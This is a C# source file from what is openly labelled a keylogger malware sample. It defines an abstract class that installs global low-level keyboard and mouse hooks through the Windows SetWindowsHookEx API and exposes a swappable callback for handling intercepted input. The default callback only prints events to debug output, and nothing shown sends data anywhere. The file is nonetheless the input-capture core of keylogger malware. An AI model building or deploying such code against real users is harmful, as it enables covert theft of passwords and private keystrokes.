using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;

namespace MalwareSample.Keylogger.Logger
{
    public abstract class HookType
    {
        #region Hook type & states - ENUM
        public enum Type
        {
            Keyboard = 13, //WH_KEYBOARD_LL
            Mouse = 14 //WH_MOUSE_LL
        }
        #endregion
        #region Import DLL user32
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        #endregion

        public delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
        public LowLevelProc _proc;

        private IntPtr _hookID = IntPtr.Zero;

        //Hook callback method
        private Func<int, IntPtr, IntPtr, IntPtr> HookCallback;

        public HookType()
        {
            this.HookCallback = DefaultHookCallback;
            this._proc = new LowLevelProc(this.HookCallback);

            //Init
            _hookID = this.SetHook();
        }

        //Destructor
        ~HookType()
        {
            UnhookWindowsHookEx(_hookID);
        }

        private IntPtr SetHook()
        {
            return this.SetHook(GetHookType());
        }

        private IntPtr SetHook(Type type)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(Convert.ToInt32(type), this._proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        public void SetHookCallback(Func<int, IntPtr, IntPtr, IntPtr> callback)
        {
            this.HookCallback = callback;
            this._proc += new LowLevelProc(this.HookCallback);
            this._proc -= new LowLevelProc(this.DefaultHookCallback);
        }

        public IntPtr CallNextHook(int nCode, IntPtr wParam, IntPtr lParam)
        {
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        protected virtual IntPtr DefaultHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            Debug.WriteLine("nCode: {0}, wParam: {1}, lParam: {2}", nCode, wParam.ToString(), Marshal.ReadInt32(lParam));
            return this.CallNextHook(nCode, wParam, lParam);
        }

        public abstract HookType.Type GetHookType();
    }
}
